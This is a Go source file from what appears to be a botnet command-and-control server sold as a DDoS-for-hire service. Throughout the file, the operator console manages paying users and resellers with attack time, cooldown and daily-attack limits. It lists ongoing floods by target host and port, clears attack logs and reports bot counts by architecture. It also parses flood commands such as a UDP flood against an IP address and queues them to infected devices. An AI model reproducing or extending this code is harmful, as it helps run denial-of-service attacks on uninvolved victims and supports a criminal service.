package masters

import (
	"cnc/core/attacks"
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"cnc/core/utils"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/alexeyco/simpletable"
)

type TimeoutInfo struct {
	Timeout  time.Time
	Duration int
	KickUser bool
}

var (
	timeoutMutex sync.Mutex
	timeouts     = make(map[string]TimeoutInfo)
)

func UserTimeout(username string, duration int) (string, bool) {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if _, exists := timeouts[username]; exists {
		return "User is already timed out.", false
	}

	expirationTime := time.Now().Add(time.Duration(duration) * time.Minute)

	timeouts[username] = TimeoutInfo{
		Timeout:  expirationTime,
		Duration: duration,
		KickUser: true,
	}

	if timeouts[username].KickUser {
		msg, success := KickUser(username)
		if !success {
			return msg, false
		}
	}

	return fmt.Sprintf("User %s has been timed out for %d minutes.", username, duration), true
}

func UserUntimeout(username string) (string, bool) {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if timeoutInfo, exists := timeouts[username]; exists {
		delete(timeouts, username)

		if timeoutInfo.KickUser {
		}

		return fmt.Sprintf("User %s has been untimed out.", username), true
	}

	return "User is not currently timed out.", false
}

func KickUser(username string) (msg string, success bool) {
	sessions.SessionMutex.Lock()
	defer sessions.SessionMutex.Unlock()

	for id, session := range sessions.Sessions {
		if session.Username == username {
			err := session.Conn.Close()
			if err != nil {
				return fmt.Sprintf("Could not kick user: %v", err), false
			}
			delete(sessions.Sessions, id)
			return fmt.Sprintf("User %s disconnected successfully", username), true
		}
	}
	return fmt.Sprintf("User %s not found in any session", username), false
}

func isTimedOut(username string) bool {
	timeoutMutex.Lock()
	defer timeoutMutex.Unlock()

	if timeoutInfo, exists := timeouts[username]; exists {
		remainingDuration := timeoutInfo.Timeout.Sub(time.Now()) // calculating duration left on timeout
		if remainingDuration > 0 {
			return true
		}
		delete(timeouts, username) // expired; remove them from timeout
	}
	return false
}

func (a *Admin) Commands() {
	for {
		var botCat string
		var botCount int
		go a.Session.FetchAttacks(a.Session.Username)
		prompt, err := DisplayPrompt(a.Session.Username)
		if err != nil {
			fmt.Println(err)
			return
		}
		a.Printf(prompt)
		cmd, err := a.ReadLine("", false)
		cmd = strings.ToLower(cmd)

		if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
			err := Display(a, "./assets/branding/clear.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "home" || cmd == "banner" {
			err := Display(a, "./assets/branding/banner.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "logout" || cmd == "exit" {
			a.Session.Remove()
			return
		}

		if err != nil || cmd == "?" || cmd == "help" || cmd == "methods" {
			err := Display(a, "./assets/branding/help.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if cmd == "" {
			continue
		}

		if cmd == "ongoing" {
			if !a.Session.Account.Admin {
				a.Println("\x1b[91myou do not have permission to do this\x1b[0m.")
				continue
			}
			attacks, err := database.DatabaseConnection.GetOngoingAttacks()
			if err != nil {
				// handle error
				fmt.Println("Error fetching ongoing attacks:", err)
				return
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "Username"},
					{Align: simpletable.AlignCenter, Text: "Host(s)"},
					{Align: simpletable.AlignCenter, Text: "Port"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Flood Type"},
					{Align: simpletable.AlignCenter, Text: "Time"},
				},
			}

			for _, attack := range attacks {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: attack["username"]},
					{Align: simpletable.AlignCenter, Text: attack["host"]},
					{Align: simpletable.AlignCenter, Text: attack["port"]},
					{Align: simpletable.AlignCenter, Text: attack["duration"]},
					{Align: simpletable.AlignCenter, Text: attack["floodType"]},
					{Align: simpletable.AlignCenter, Text: attack["time"]},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)
			a.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			continue
		}

		if cmd == "broadcast" {
			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
			}
			a.Println("Provide a message to broadcast")
			continue
		}

		if strings.HasPrefix(cmd, "broadcast ") {
			message := strings.TrimPrefix(cmd, "broadcast ")
			if a.Session.Account.Admin {
				BroadcastMessage(message)
			} else {
				a.Println("You aren't authorized to use this.")
			}
			continue
		}

		if a.Session.Account.Admin && cmd == "clearlogs" {
			confirm, err := a.ReadLine("Are you sure? (y/n): ", false)
			if confirm != "y" {
				continue
			}
			if err != nil {
				a.Println(fmt.Sprintf("unable to clear logs: %v", err))
				continue
			}
			if !database.DatabaseConnection.CleanLogs() {
				a.Println("Unable to clear logs, try again later.")
			}
			a.Println("all logs have been cleared successfully!")
			fmt.Printf("[warn] %s cleared all attack logs!\n", a.Session.Username)
			continue
		}

		if a.Session.Account.Admin && cmd == "attacks" {
			if GlobalAttacks {
				a.Println("\u001B[0mAttacks are now \u001B[31mdisabled\u001B[0m.")
				GlobalAttacks = false
			} else {
				a.Println("\u001B[0mAttacks are now \u001B[92menabled\u001B[0m.")
				GlobalAttacks = true
			}
			continue
		}

		if cmd == "users" {
			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			activeUsers, err := database.DatabaseConnection.Users()
			if err != nil {
				fmt.Println(err)
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Administrator"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Max Time"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Cooldown"},
				},
			}

			for _, user := range activeUsers {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if user.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(user.Bots)
				if user.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(user.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}
				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + user.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.MaxTime)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.Cooldown)},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if strings.HasPrefix(cmd, "users add") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 11 {
				a.Println("Usage: users add <Username> <Password> [...options]")
				a.Println("Example: users add newuser secretpass -1 60 100 100 1d false false")
				a.Println("")
				a.Println("Add argument documentation:")
				a.Println("   Username          -   The username of the new user")
				a.Println("   Password          -   The New_pass of the new user")
				a.Println("   Max Bots          -   The maximum number of devices the new user can access")
				a.Println("   Attack Duration   -   The maximum attack duration for the new user")
				a.Println("   Attack Cooldown   -   The cooldown between attacks for the new user")
				a.Println("   Max Daily Attacks -   The maximum number of attacks per day for the new user")
				a.Println("   Account Expiry    -   The time before the new user's account expires (e.g., 1d1w1m1s)")
				a.Println("   Admin Status      -   Is the new user an admin?")
				a.Println("   Reseller Status   -   Is the new user a reseller?")
				a.Println("")
				a.Println("Remove argument documentation:")
				a.Println("   Username          -   The user to remove")
				continue
			}

			NewUser := args[2]
			NewPass := args[3]
			maxBotsStr := args[4]
			durationStr := args[5]
			cooldownStr := args[6]
			userMaxAttacksStr := args[7]
			expiryHoursStr := args[8]
			isAdminStr := args[9]
			isResellerStr := args[10]

			// Convert and parse the arguments as needed
			maxBots, err := strconv.Atoi(maxBotsStr)
			if err != nil {
				a.Println("Invalid Max Bots value.")
				continue
			}
			duration, err := strconv.Atoi(durationStr)
			if err != nil {
				a.Println("Invalid Attack Duration value.")
				continue
			}
			cooldown, err := strconv.Atoi(cooldownStr)
			if err != nil {
				a.Println("Invalid Attack Cooldown value.")
				continue
			}
			userMaxAttacks, err := strconv.Atoi(userMaxAttacksStr)
			if err != nil {
				a.Println("Invalid Max Daily Attacks value.")
				continue
			}
			expiryDuration, err := utils.ParseDuration(expiryHoursStr)
			if err != nil {
				a.Println("Invalid time format: ", err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()
			isAdmin, err := strconv.ParseBool(isAdminStr)
			if err != nil {
				a.Println("Invalid Admin Status value.")
				continue
			}
			isReseller, err := strconv.ParseBool(isResellerStr)
			if err != nil {
				a.Println("Invalid Reseller Status value.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isAdmin {
				a.Println("Resellers cannot add admin users.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isReseller {
				a.Println("Resellers cannot add other resellers.")
				continue
			}

			if database.DatabaseConnection.CreateUser(NewUser, NewPass, maxBots, userMaxAttacks, duration, cooldown, expiry, isAdmin, isReseller, NewUser) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if strings.HasPrefix(cmd, "users remove") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users remove <username>, e.g., users remove tester")
				continue
			}

			usernameToRemove := args[2]

			if a.Session.Account.Reseller && !database.DatabaseConnection.CheckUserCreatedBy(usernameToRemove, a.Session.Username) && !a.Session.Account.Admin {
				a.Println("Resellers can only remove users they have created.")
				continue
			}

			KickUser(usernameToRemove)

			err := database.DatabaseConnection.RemoveUser(usernameToRemove)
			if err != nil {
				a.Println("Error removing user: ", err)
				continue
			}
			a.Println(fmt.Sprintf("Removed @%s successfully.", usernameToRemove))
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: users timeout <username> <duration>, e.g., users timeout tester 5")
				continue
			}
			usernameToTimeout := args[2]
			timeoutDurationStr := args[3]
			timeoutDuration, err := strconv.Atoi(timeoutDurationStr)
			if err != nil {
				a.Println("Invalid duration value.")
				continue
			}

			msg, success := UserTimeout(usernameToTimeout, timeoutDuration)
			a.Println(msg)
			if success {
				log.Printf("[admin - timeout] User '%s' has been timed out for %d minutes\n", usernameToTimeout, timeoutDuration)
				continue
			}
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users untimeout <username>, e.g., users untimeout tester")
				continue
			}

			usernameToUntimeout := args[2]
			msg, success := UserUntimeout(usernameToUntimeout)
			a.Println(msg)
			if success {
				// Optionally, log the untimeout action
				log.Printf("[admin - untimeout] User '%s' has been untimed out\n", usernameToUntimeout)
			}
			continue
		}

		if strings.HasPrefix(cmd, "sessions kick") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: sessions kick <username>, e.g., sessions kick tester")
				continue
			}

			usernameToRemove := args[2]
			KickUser(usernameToRemove)
			a.Println("Kicked " + usernameToRemove + " successfully")
			continue
		}

		err = parsePresetsJSON("assets/presets.json")
		if err != nil {
			a.Println("Error loading presets:", err)
			return
		}

		if strings.HasPrefix(cmd, "add") {
			args := strings.Fields(cmd)

			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: add <preset> <username> <password>")
				a.Println("Example: add day newUser change!!1\r\n")
				a.Println("Available Presets:")
				for _, p := range presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}
			NewUser := args[2]
			NewPass := args[3]
			presetName := args[1]

			var selectedPreset PresetInfo
			presetFound := false

			for _, p := range presets {
				if p.Preset == presetName {
					selectedPreset = p
					presetFound = true
					break
				}
			}

			if !presetFound {
				a.Println("Invalid preset. Available presets are:")
				for _, p := range presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}

			expiryDuration, err := utils.ParseDuration(selectedPreset.Expiry)
			if err != nil {
				a.Println(err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()

			if database.DatabaseConnection.CreateUser(NewUser, NewPass, selectedPreset.MaxBots, selectedPreset.UserMaxAttacks, selectedPreset.Duration, selectedPreset.Cooldown, expiry, selectedPreset.IsAdmin, selectedPreset.IsReseller, a.Session.Username) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if err != nil || strings.ToLower(strings.Split(cmd, " ")[0]) == "sessions" { // TODO: Simplify this and make it show expiry
			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Username"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Administrator"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Attacks"},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + "Remote Host"},
				},
			}

			for _, s := range sessions.Sessions {
				var admin = "\x1b[48;5;9m\x1b[38;5;16m FALSE \x1b[0m"
				if s.Account.Admin {
					admin = "\x1b[48;5;10m\x1b[38;5;16m TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(s.Account.Bots)
				if s.Account.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(s.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}

				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + s.Account.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strings.Split(s.Conn.RemoteAddr().String(), ":")[0]},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if cmd == "passwd" {
			newPw, _ := a.ReadLine("New Password: ", true)
			newPwConfirm, _ := a.ReadLine("New Password (confirm): ", true)

			if newPwConfirm != newPw {
				a.Println("Your password must match in both inputs.")
				continue
			}
			err := database.DatabaseConnection.Changepw(a.Session.Username, newPw)
			if err != nil {
				a.Println("unknown error. Try again later!")
				continue
			}
			a.Println("Password successfully updated!")
			continue
		}

		if cmd == "bots" {
			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to do this!")
				continue
			}

			m := slaves.CL.Distribution()

			if previousDistribution != nil {
				for k, v := range m {
					change := v - previousDistribution[k]
					if change < 0 {
						a.Printf("\u001B[0m%s(\x1b[91m%d\x1b[0m): %d\r\n", k, change, v)
					} else if change > 0 {
						a.Printf("\u001B[0m%s(\x1b[92m+%d\x1b[0m): %d\r\n", k, change, v)
					} else {
						a.Printf("\u001B[0m%s: %d\r\n", k, v)
					}
				}
			} else {
				for k, v := range m {
					a.Printf("\u001B[0m%s: %d\r\n", k, v)
				}
			}

			previousDistribution = m
			continue
		}

		if cmd[0] == '@' {
			if !a.Session.Account.Admin {
				a.Println("You aren't authorized to use this.")
				continue
			}

			cataSplit := strings.SplitN(cmd, " ", 2)

			if len(cataSplit) > 1 {
				botCat = cataSplit[0][1:]
				cmd = cataSplit[1]
			} else {
				a.Println("Usage: @<group> <command>")
				a.Println("Example: @x86 .udpplain 70.70.70.72 30 dport=80 size=1400")
				continue
			}
		}

		botCount = a.Session.Account.Bots
		var xd int
		if a.Session.Account.Admin {
			xd = 1
		} else {
			xd = 0
		}
		atk, err := attacks.NewAttack(cmd, xd, a.Session.Username)
		if err != nil {
			a.Println(err.Error())
		} else {
			buf, err := atk.Build()
			if err != nil {
				a.Println(err.Error())
			} else {
				if GlobalSlots >= attacks.MaxGlobalSlots {
					a.Println("All attack slots are in use, please wait.")
					continue
				}
				if can, err := database.DatabaseConnection.CanLaunchAttack(a.Session.Username, atk.Duration, cmd, botCount, 0); !can {
					a.Println(err.Error())
				} else {
					go a.SlotsCooldown(a.Session.Username)
					err := Display(a, "assets/branding/attack_sent.txt", a.Session.Username)
					if err != nil {
						continue
					}
					slaves.CL.QueueBuf(buf, botCount, botCat)
					err = database.DatabaseConnection.IncreaseTotalAttacks(a.Session.Username)
					if err != nil {
						fmt.Println(err)
						continue
					}
				}
			}
		}
	}

}
func parseCommand(command string) (method, target, dport, length string) {
	parts := strings.Split(command, " ")

	if len(parts) < 3 {
		return "N/A", "N/A", "N/A", "N/A"
	}

	method = parts[0]
	target = parts[1]

	for _, part := range parts[2:] {
		if strings.HasPrefix(part, "dport=") {
			dport = strings.TrimPrefix(part, "dport=")
		} else if strings.HasPrefix(part, "len=") || strings.HasPrefix(part, "size=") {
			length = strings.TrimPrefix(part, "len=")
			length = strings.TrimPrefix(length, "size=")
		}
	}

	if dport == "" {
		dport = "N/A"
	}
	if length == "" {
		length = "N/A"
	}

	return method, target, dport, length
}
